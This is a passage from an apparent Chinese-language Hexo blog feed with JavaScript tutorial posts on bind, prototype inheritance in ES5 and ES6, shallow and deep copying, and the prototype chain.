class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div></pre></td><td class="code"><pre><div class="line"><span class="built_in">Function</span>.prototype.myBind = <span class="function"><span class="keyword">function</span> (<span class="params">context</span>) </span>&#123;</div><div class="line">  <span class="keyword">if</span> (<span class="keyword">typeof</span> <span class="keyword">this</span> !== <span class="string">'function'</span>) &#123;</div><div class="line">    <span class="keyword">throw</span> <span class="keyword">new</span> <span class="built_in">TypeError</span>(<span class="string">'Error'</span>)</div><div class="line">  &#125;</div><div class="line">  <span class="keyword">var</span> _this = <span class="keyword">this</span></div><div class="line">  <span class="keyword">var</span> args = [...arguments].slice(<span class="number">1</span>)</div><div class="line">  <span class="comment">// 返回一个函数</span></div><div class="line">  <span class="keyword">return</span> <span class="function"><span class="keyword">function</span> <span class="title">F</span>(<span class="params"></span>) </span>&#123;</div><div class="line">    <span class="comment">// 因为返回了一个函数，我们可以 new F()，所以需要判断</span></div><div class="line">    <span class="keyword">if</span> (<span class="keyword">this</span> <span class="keyword">instanceof</span> F) &#123;</div><div class="line">      <span class="keyword">return</span> <span class="keyword">new</span> _this(...args, ...arguments)</div><div class="line">    &#125;</div><div class="line">    <span class="keyword">return</span> _this.apply(context, args.concat(...arguments))</div><div class="line">  &#125;</div><div class="line">&#125;</div></pre></td></tr></table></figure></p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;&lt;a href=&quot;http://wangsiyuan233.cn/2018/03/04/27%E8%81%8A%E8%81%8A%E7%B3%BB%E5%88%97-2/&quot;&gt;【【【this 实例-第9条】】】&lt;/a&gt;&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;一、 call 和 apply 的异同&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;&lt;code&gt;call&lt;/code&gt; 和 &lt;code&gt;apply&lt;/code&gt; 都是为了解决改变 &lt;code&gt;this&lt;/code&gt; 的指向。作用都是相同的，只是传参的方式不同。&lt;/p&gt;
&lt;p&gt;除了第一个参数外，&lt;code&gt;call&lt;/code&gt; 可以接收一个参数列表，&lt;code&gt;apply&lt;/code&gt; 只接受一个参数数组。&lt;br&gt;&lt;figure class=&quot;highlight javascript&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;div class=&quot;line&quot;&gt;1&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;2&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;3&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;4&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;5&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;6&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;7&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;8&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;9&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;10&lt;/div&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;div class=&quot;line&quot;&gt;&lt;span class=&quot;keyword&quot;&gt;let&lt;/span&gt; a = &amp;#123;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;    &lt;span class=&quot;attr&quot;&gt;value&lt;/span&gt;: &lt;span class=&quot;number&quot;&gt;1&lt;/span&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&amp;#125;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&lt;span class=&quot;function&quot;&gt;&lt;span class=&quot;keyword&quot;&gt;function&lt;/span&gt; &lt;span class=&quot;title&quot;&gt;getValue&lt;/span&gt;(&lt;span class=&quot;params&quot;&gt;name, age&lt;/span&gt;) &lt;/span&gt;&amp;#123;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;    &lt;span class=&quot;built_in&quot;&gt;console&lt;/span&gt;.log(name)&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;    &lt;span class=&quot;built_in&quot;&gt;console&lt;/span&gt;.log(age)&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;    &lt;span class=&quot;built_in&quot;&gt;console&lt;/span&gt;.log(&lt;span class=&quot;keyword&quot;&gt;this&lt;/span&gt;.value)&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&amp;#125;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;getValue.call(a, &lt;span class=&quot;string&quot;&gt;&#39;yck&#39;&lt;/span&gt;, &lt;span class=&quot;string&quot;&gt;&#39;24&#39;&lt;/span&gt;)&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;getValue.apply(a, [&lt;span class=&quot;string&quot;&gt;&#39;yck&#39;&lt;/span&gt;, &lt;span class=&quot;string&quot;&gt;&#39;24&#39;&lt;/span&gt;])&lt;/div&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;/p&gt;
    
    </summary>
    
    
      <category term="聊聊系列" scheme="wangsiyuan233.github.io/tags/%E8%81%8A%E8%81%8A%E7%B3%BB%E5%88%97/"/>
    
  </entry>
  
  <entry>
    <title>聊聊系列(5)-- 继承</title>
    <link href="wangsiyuan233.github.io/2018/08/22/67%E8%81%8A%E8%81%8A%E7%B3%BB%E5%88%97-5/"/>
    <id>wangsiyuan233.github.io/2018/08/22/67聊聊系列-5/</id>
    <published>2018-08-22T13:11:28.000Z</published>
    <updated>2018-08-23T17:16:08.313Z</updated>
    
    <content type="html"><![CDATA[<blockquote><p>一、ES5</p></blockquote><p>在 ES5 中，我们可以使用如下方式解决继承的问题,实现思路就是将子类的原型设置为父类的原型<br><figure class="highlight javascript"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div></pre></td><td class="code"><pre><div class="line"><span class="function"><span class="keyword">function</span> <span class="title">Super</span>(<span class="params"></span>) </span>&#123;&#125;</div><div class="line">Super.prototype.getNumber = <span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</div><div class="line">  <span class="keyword">return</span> <span class="number">1</span></div><div class="line">&#125;</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">function</span> <span class="title">Sub</span>(<span class="params"></span>) </span>&#123;&#125;</div><div class="line"><span class="keyword">let</span> s = <span class="keyword">new</span> Sub()</div><div class="line">Sub.prototype = <span class="built_in">Object</span>.create(Super.prototype, &#123;</div><div class="line">  <span class="attr">constructor</span>: &#123;</div><div class="line">    <span class="attr">value</span>: Sub,</div><div class="line">    <span class="attr">enumerable</span>: <span class="literal">false</span>,</div><div class="line">    <span class="attr">writable</span>: <span class="literal">true</span>,</div><div class="line">    <span class="attr">configurable</span>: <span class="literal">true</span></div><div class="line">  &#125;</div><div class="line">&#125;)</div></pre></td></tr></table></figure></p><a id="more"></a><blockquote><p>二、ES6</p></blockquote><p>通过 class 语法轻松解决ES5的问题<br><figure class="highlight scala"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></td><td class="code"><pre><div class="line"><span class="class"><span class="keyword">class</span> <span class="title">MyDate</span> <span class="keyword">extends</span> <span class="title">Date</span> </span>&#123;</div><div class="line">  test() &#123;</div><div class="line">    <span class="keyword">return</span> <span class="keyword">this</span>.getTime()</div><div class="line">  &#125;</div><div class="line">&#125;</div><div class="line">let myDate = <span class="keyword">new</span> <span class="type">MyDate</span>()</div><div class="line">myDate.test()</div></pre></td></tr></table></figure></p><p>但是 ES6 不是所有浏览器都兼容，所以我们需要使用 Babel 来编译这段代码。</p><p>如果你使用编译过得代码调用 <code>myDate.test()</code> 你会惊奇地发现出现了报错<br><img src="https://i.imgur.com/5EPAs20.png" alt=""><br>因为在 JS 底层有限制，如果不是由 Date 构造出来的实例的话，是不能调用 Date 里的函数的。所以这也侧面的说明了：ES6 中的 <code>class</code> 继承与 ES5 中的一般继承写法是不同的。</p><p>既然底层限制了实例必须由 Date 构造出来，那么我们可以改变下思路实现继承<br><figure class="highlight javascript"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div></pre></td><td class="code"><pre><div class="line"><span class="function"><span class="keyword">function</span> <span class="title">MyData</span>(<span class="params"></span>) </span>&#123;</div><div class="line"></div><div class="line">&#125;</div><div class="line">MyData.prototype.test = <span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;</div><div class="line">  <span class="keyword">return</span> <span class="keyword">this</span>.getTime()</div><div class="line">&#125;</div><div class="line"><span class="keyword">let</span> d = <span class="keyword">new</span> <span class="built_in">Date</span>()</div><div class="line"><span class="built_in">Object</span>.setPrototypeOf(d, MyData.prototype)</div><div class="line"><span class="built_in">Object</span>.setPrototypeOf(MyData.prototype, <span class="built_in">Date</span>.prototype)</div></pre></td></tr></table></figure></p><p>以上继承实现思路：先创建父类实例 =&gt; 改变实例原先的 <code>_proto__</code> 转而连接到子类的 <code>prototype</code> =&gt; 子类的 <code>prototype</code> 的 <code>__proto__</code> 改为父类的 <code>prototype</code>。</p><p>通过以上方法实现的继承就可以完美解决 JS 底层的这个限制。</p>]]></content>
    
    <summary type="html">
    
      &lt;blockquote&gt;
&lt;p&gt;一、ES5&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;在 ES5 中，我们可以使用如下方式解决继承的问题,实现思路就是将子类的原型设置为父类的原型&lt;br&gt;&lt;figure class=&quot;highlight javascript&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;div class=&quot;line&quot;&gt;1&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;2&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;3&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;4&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;5&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;6&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;7&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;8&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;9&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;10&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;11&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;12&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;13&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;14&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;15&lt;/div&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;div class=&quot;line&quot;&gt;&lt;span class=&quot;function&quot;&gt;&lt;span class=&quot;keyword&quot;&gt;function&lt;/span&gt; &lt;span class=&quot;title&quot;&gt;Super&lt;/span&gt;(&lt;span class=&quot;params&quot;&gt;&lt;/span&gt;) &lt;/span&gt;&amp;#123;&amp;#125;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;Super.prototype.getNumber = &lt;span class=&quot;function&quot;&gt;&lt;span class=&quot;keyword&quot;&gt;function&lt;/span&gt;(&lt;span class=&quot;params&quot;&gt;&lt;/span&gt;) &lt;/span&gt;&amp;#123;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;  &lt;span class=&quot;keyword&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;number&quot;&gt;1&lt;/span&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&amp;#125;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&lt;span class=&quot;function&quot;&gt;&lt;span class=&quot;keyword&quot;&gt;function&lt;/span&gt; &lt;span class=&quot;title&quot;&gt;Sub&lt;/span&gt;(&lt;span class=&quot;params&quot;&gt;&lt;/span&gt;) &lt;/span&gt;&amp;#123;&amp;#125;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&lt;span class=&quot;keyword&quot;&gt;let&lt;/span&gt; s = &lt;span class=&quot;keyword&quot;&gt;new&lt;/span&gt; Sub()&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;Sub.prototype = &lt;span class=&quot;built_in&quot;&gt;Object&lt;/span&gt;.create(Super.prototype, &amp;#123;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;  &lt;span class=&quot;attr&quot;&gt;constructor&lt;/span&gt;: &amp;#123;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;    &lt;span class=&quot;attr&quot;&gt;value&lt;/span&gt;: Sub,&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;    &lt;span class=&quot;attr&quot;&gt;enumerable&lt;/span&gt;: &lt;span class=&quot;literal&quot;&gt;false&lt;/span&gt;,&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;    &lt;span class=&quot;attr&quot;&gt;writable&lt;/span&gt;: &lt;span class=&quot;literal&quot;&gt;true&lt;/span&gt;,&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;    &lt;span class=&quot;attr&quot;&gt;configurable&lt;/span&gt;: &lt;span class=&quot;literal&quot;&gt;true&lt;/span&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;  &amp;#125;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&amp;#125;)&lt;/div&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;/p&gt;
    
    </summary>
    
    
      <category term="聊聊系列" scheme="wangsiyuan233.github.io/tags/%E8%81%8A%E8%81%8A%E7%B3%BB%E5%88%97/"/>
    
  </entry>
  
  <entry>
    <title>聊聊系列(4)-- 深浅拷贝</title>
    <link href="wangsiyuan233.github.io/2018/08/20/66%E8%81%8A%E8%81%8A%E7%B3%BB%E5%88%97-4/"/>
    <id>wangsiyuan233.github.io/2018/08/20/66聊聊系列-4/</id>
    <published>2018-08-20T12:27:23.000Z</published>
    <updated>2018-08-23T04:11:18.183Z</updated>
    
    <content type="html"><![CDATA[<p>如果<strong>给一个变量赋值一个对象</strong>，那么两者的值会是同一个引用，其中一方改变，另一方也会相应改变。<br><figure class="highlight stylus"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line">let <span class="selector-tag">a</span> = &#123;</div><div class="line">    age: <span class="number">1</span></div><div class="line">&#125;</div><div class="line">let <span class="selector-tag">b</span> = <span class="selector-tag">a</span></div><div class="line"><span class="selector-tag">a</span><span class="selector-class">.age</span> = <span class="number">2</span></div><div class="line">console.log(<span class="selector-tag">b</span>.age) <span class="comment">// 2</span></div></pre></td></tr></table></figure></p><p>我们不想要这样的情况出现在开发中，需要浅拷贝<br><a id="more"></a></p><blockquote><p>一、浅拷贝</p></blockquote><p>1、通过 <code>Object.assign</code><br><figure class="highlight stylus"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line">let <span class="selector-tag">a</span> = &#123;</div><div class="line">    age: <span class="number">1</span></div><div class="line">&#125;</div><div class="line">let <span class="selector-tag">b</span> = Object.assign(&#123;&#125;, a)</div><div class="line"><span class="selector-tag">a</span><span class="selector-class">.age</span> = <span class="number">2</span></div><div class="line">console.log(<span class="selector-tag">b</span>.age) <span class="comment">// 1</span></div></pre></td></tr></table></figure></p><p>2、通过展开运算符（…）<br><figure class="highlight stylus"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line">let <span class="selector-tag">a</span> = &#123;</div><div class="line">    age: <span class="number">1</span></div><div class="line">&#125;</div><div class="line">let <span class="selector-tag">b</span> = &#123;...a&#125;</div><div class="line"><span class="selector-tag">a</span><span class="selector-class">.age</span> = <span class="number">2</span></div><div class="line">console.log(<span class="selector-tag">b</span>.age) <span class="comment">// 1</span></div></pre></td></tr></table></figure></p><p>通常浅拷贝就能解决大部分问题了，但是当我们遇到如下情况就需要使用到深拷贝了<br><figure class="highlight stylus"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div></pre></td><td class="code"><pre><div class="line">let <span class="selector-tag">a</span> = &#123;</div><div class="line">    age: <span class="number">1</span>,</div><div class="line">    jobs: &#123;</div><div class="line">        first: <span class="string">'FE'</span></div><div class="line">    &#125;</div><div class="line">&#125;</div><div class="line">let <span class="selector-tag">b</span> = &#123;...a&#125;</div><div class="line"><span class="selector-tag">a</span><span class="selector-class">.jobs</span><span class="selector-class">.first</span> = <span class="string">'native'</span></div><div class="line">console.log(<span class="selector-tag">b</span><span class="selector-class">.jobs</span><span class="selector-class">.first</span>) <span class="comment">// native</span></div></pre></td></tr></table></figure></p><p>浅拷贝只解决了第一层的问题，如果接下去的值中还有对象的话，那么就又回到刚开始的话题了，两者享有相同的引用。要解决这个问题，我们需要引入深拷贝。</p><blockquote><p>二、深拷贝</p></blockquote><p>1、这个问题通常可以通过 <code>JSON.parse(JSON.stringify(object))</code> 来解决。<br><figure class="highlight stylus"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div></pre></td><td class="code"><pre><div class="line">let <span class="selector-tag">a</span> = &#123;</div><div class="line">    age: <span class="number">1</span>,</div><div class="line">    jobs: &#123;</div><div class="line">        first: <span class="string">'FE'</span></div><div class="line">    &#125;</div><div class="line">&#125;</div><div class="line">let <span class="selector-tag">b</span> = JSON.parse(JSON.stringify(a))</div><div class="line"><span class="selector-tag">a</span><span class="selector-class">.jobs</span><span class="selector-class">.first</span> = <span class="string">'native'</span></div><div class="line">console.log(<span class="selector-tag">b</span><span class="selector-class">.jobs</span><span class="selector-class">.first</span>) <span class="comment">// FE</span></div></pre></td></tr></table></figure></p><p>但是该方法也是有<strong>局限性</strong>的：</p><ul><li>会忽略 undefined</li><li>不能序列化函数</li><li>不能解决循环引用的对象</li></ul><p>例如：<br><figure class="highlight stylus"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div></pre></td><td class="code"><pre><div class="line">let obj = &#123;</div><div class="line">  <span class="selector-tag">a</span>: <span class="number">1</span>,</div><div class="line">  <span class="selector-tag">b</span>: &#123;</div><div class="line">    c: <span class="number">2</span>,</div><div class="line">    d: <span class="number">3</span>,</div><div class="line">  &#125;,</div><div class="line">&#125;</div><div class="line">obj<span class="selector-class">.c</span> = obj<span class="selector-class">.b</span></div><div class="line">obj<span class="selector-class">.e</span> = obj<span class="selector-class">.a</span></div><div class="line">obj<span class="selector-class">.b</span><span class="selector-class">.c</span> = obj<span class="selector-class">.c</span></div><div class="line">obj<span class="selector-class">.b</span><span class="selector-class">.d</span> = obj<span class="selector-class">.b</span></div><div class="line">obj<span class="selector-class">.b</span><span class="selector-class">.e</span> = obj<span class="selector-class">.b</span><span class="selector-class">.c</span></div><div class="line">let newObj = JSON.parse(JSON.stringify(obj))</div><div class="line">console.log(newObj)</div></pre></td></tr></table></figure></p><p>如果你用上面的方法深拷贝，你会发现如下报错：<br><img src="https://i.imgur.com/mIZISaM.png" alt=""></p><p>在遇到函数或者 undefined 的时候，该对象也不能正常的序列化<br><figure class="highlight javascript"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">let</span> a = &#123;</div><div class="line">    <span class="attr">age</span>: <span class="literal">undefined</span>,</div><div class="line">    <span class="attr">jobs</span>: <span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;&#125;,</div><div class="line">    <span class="attr">name</span>: <span class="string">'yck'</span></div><div class="line">&#125;</div><div class="line"><span class="keyword">let</span> b = <span class="built_in">JSON</span>.parse(<span class="built_in">JSON</span>.stringify(a))</div><div class="line"><span class="built_in">console</span>.log(b) <span class="comment">// &#123;name: "yck"&#125;</span></div></pre></td></tr></table></figure></p><p>你会发现在上述情况中，该方法会忽略掉函数和 <code>undefined</code></p><p>2、在通常情况下，复杂数据都是可以序列化的，所以这个函数可以解决大部分问题，并且该函数是内置函数中处理深拷贝性能最快的。当然如果你的数据中含有以上三种情况下，可以使用 <a href="https://lodash.com/docs/4.17.10#cloneDeep" target="_blank" rel="external">lodash 的深拷贝函数</a>。</p><p>3、如果你所需拷贝的对象含有内置类型并且不包含函数，可以使用 <code>MessageChannel</code><br><figure class="highlight javascript"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div></pre></td><td class="code"><pre><div class="line"><span class="function"><span class="keyword">function</span> <span class="title">structuralClone</span>(<span class="params">obj</span>) </span>&#123;</div><div class="line">  <span class="keyword">return</span> <span class="keyword">new</span> <span class="built_in">Promise</span>(<span class="function"><span class="params">resolve</span> =&gt;</span> &#123;</div><div class="line">    <span class="keyword">const</span> &#123;port1, port2&#125; = <span class="keyword">new</span> MessageChannel();</div><div class="line">    port2.onmessage = <span class="function"><span class="params">ev</span> =&gt;</span> resolve(ev.data);</div><div class="line">    port1.postMessage(obj);</div><div class="line">  &#125;);</div><div class="line">&#125;</div><div class="line"></div><div class="line"><span class="keyword">var</span> obj = &#123;<span class="attr">a</span>: <span class="number">1</span>, <span class="attr">b</span>: &#123;</div><div class="line">    <span class="attr">c</span>: b</div><div class="line">&#125;&#125;</div><div class="line"><span class="comment">// 注意该方法是异步的</span></div><div class="line"><span class="comment">// 可以处理 undefined 和循环引用对象</span></div><div class="line"><span class="keyword">const</span> clone = <span class="keyword">await</span> structuralClone(obj);</div></pre></td></tr></table></figure></p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;如果&lt;strong&gt;给一个变量赋值一个对象&lt;/strong&gt;，那么两者的值会是同一个引用，其中一方改变，另一方也会相应改变。&lt;br&gt;&lt;figure class=&quot;highlight stylus&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;div class=&quot;line&quot;&gt;1&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;2&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;3&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;4&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;5&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;6&lt;/div&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;div class=&quot;line&quot;&gt;let &lt;span class=&quot;selector-tag&quot;&gt;a&lt;/span&gt; = &amp;#123;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;    age: &lt;span class=&quot;number&quot;&gt;1&lt;/span&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&amp;#125;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;let &lt;span class=&quot;selector-tag&quot;&gt;b&lt;/span&gt; = &lt;span class=&quot;selector-tag&quot;&gt;a&lt;/span&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&lt;span class=&quot;selector-tag&quot;&gt;a&lt;/span&gt;&lt;span class=&quot;selector-class&quot;&gt;.age&lt;/span&gt; = &lt;span class=&quot;number&quot;&gt;2&lt;/span&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;console.log(&lt;span class=&quot;selector-tag&quot;&gt;b&lt;/span&gt;.age) &lt;span class=&quot;comment&quot;&gt;// 2&lt;/span&gt;&lt;/div&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;/p&gt;
&lt;p&gt;我们不想要这样的情况出现在开发中，需要浅拷贝&lt;br&gt;
    
    </summary>
    
    
      <category term="聊聊系列" scheme="wangsiyuan233.github.io/tags/%E8%81%8A%E8%81%8A%E7%B3%BB%E5%88%97/"/>
    
  </entry>
  
  <entry>
    <title>深入理解JavaScript--原型系列(5)</title>
    <link href="wangsiyuan233.github.io/2018/08/13/65%E5%8E%9F%E5%9E%8B%E7%B3%BB%E5%88%97-5/"/>
    <id>wangsiyuan233.github.io/2018/08/13/65原型系列-5/</id>
    <published>2018-08-13T12:18:18.000Z</published>
    <updated>2018-08-21T03:13:09.122Z</updated>
    
    <content type="html"><![CDATA[<blockquote><p>一、prototype</p></blockquote><p>1、<code>prototype</code> 是一个显式原型属性，只有函数才拥有该属性。基本上所有函数都有这个属性，但是也有一个例外:</p><p> <code>let fun = Function.prototype.bind()</code></p><p>如果你以上述方法创建一个函数，那么可以发现这个函数是不具有 prototype 属性的。</p><p>2、当我们声明一个函数时，这个属性就被自动创建了。 <code>function Foo() {}</code></p><p>并且这个属性的值是一个对象（也就是原型），只有一个属性 <code>constructor</code></p><p><code>constructor</code> 对应着构造函数，也就是 <code>Foo</code>。</p><p>3、<code>constructor</code>是一个公有且不可枚举的属性。一旦我们改变了函数的 <code>prototype</code> ，那么新对象就没有这个属性了（当然可以通过原型链取到 <code>constructor</code>）。</p><p><code>constructor</code>属性到底有什么用呢？</p><ul><li><p>让实例对象知道是什么函数构造了它</p></li><li><p>如果想给某些类库中的构造函数增加一些自定义的方法，就可以通过 xx.constructor.method 来扩展</p></li><li><a id="more"></a></li></ul><blockquote><p>二、<code>_proto_</code></p></blockquote><p>这是每个对象都有的隐式原型属性，指向了创建该对象的构造函数的原型。其实这个属性指向了<code>[[prototype]]</code>，但是 <code>[[prototype]]</code> 是内部属性，我们并不能访问到，所以使用 <code>_proto_</code> 来访问。</p><p>因为在 JS 中是没有类的概念的，为了实现类似继承的方式，通过 <code>_proto_</code> 将对象和原型联系起来组成原型链，得以让对象可以访问到不属于自己的属性。</p><p>实例对象的 <code>_proto_</code> 如何产生的？</p><p>从上图可知，当我们使用 <code>new</code> 操作符时，生成的实例对象拥有了 <code>_proto_</code> 属性。<br><figure class="highlight fortran"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line"><span class="function"><span class="keyword">function</span></span> Foo() &#123;&#125;</div><div class="line">// 这个函数是 <span class="function"><span class="keyword">Function</span></span> 的实例对象</div><div class="line">// <span class="function"><span class="keyword">function</span></span> 就是一个语法糖</div><div class="line">// 内部调用了 new <span class="function"><span class="keyword">Function</span><span class="params">(...)</span></span></div></pre></td></tr></table></figure></p><p>所以可以说，在 <code>new</code> 的过程中，新对象被添加了 <code>_proto_</code> 并且链接到构造函数的原型上。</p><p>对于实例对象来说，都是通过 <code>new</code> 产生的，无论是 <code>function Foo()</code> 还是 <code>let a = { b : 1 }</code> 。</p><p>对于创建一个对象来说，更推荐使用字面量的方式创建对象。因为你使用 <code>new Object()</code> 的方式创建对象需要通过作用域链一层层找到 <code>Object</code>，但是你使用字面量的方式就没这个问题。<br><figure class="highlight monkey"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line"><span class="function"><span class="keyword">function</span> <span class="title">Foo</span>(</span>) &#123;&#125;</div><div class="line">// <span class="function"><span class="keyword">function</span> 就是个语法糖</span></div><div class="line">// 内部等同于 <span class="keyword">new</span> <span class="function"><span class="keyword">Function</span>(</span>)</div><div class="line">let a = &#123; b: <span class="number">1</span> &#125;</div><div class="line">// 这个字面量内部也是使用了 <span class="keyword">new</span> Object()</div></pre></td></tr></table></figure></p><p>之前总结的<a href="http://wangsiyuan233.cn/2018/02/18/17%E5%8E%9F%E5%9E%8B%E9%93%BE%E5%AE%9E%E4%BE%8B/" target="_blank" rel="external">原型链实例</a></p><p>所有对象都可以通过原型链最终找到 <code>Object.prototype</code> ，虽然 <code>Object.prototype</code> 也是一个对象，但是这个对象却不是 <code>Object</code> 创造的，而是引擎自己创建了 <code>Object.prototype</code> 。所以可以这样说：<strong>所有实例都是对象，但是对象不一定都是实例。</strong></p><p>首先引擎创建了 <code>Object.prototype</code> ，然后创建了 <code>Function.prototype</code> ，并且通过<code>__proto__</code>将两者联系了起来。</p><p>这里也很好的解释了一个问题，为什么 <code>let fun = Function.prototype.bind()</code> 没有 <code>prototype</code> 属性。因为 <code>Function.prototype</code> 是引擎创建出来的对象，引擎认为不需要给这个对象添加 <code>prototype</code> 属性。</p><p>所以我们又可以得出一个结论，<strong>不是所有函数都是 new Function() 产生的。</strong></p><p>有了 <code>Function.prototype</code> 以后才有了 <code>function Function()</code> ，然后其他的构造函数都是 <code>function Function()</code> 生成的。</p><p>现在可以来解释 <code>Function.__proto__ === Function.prototype</code> 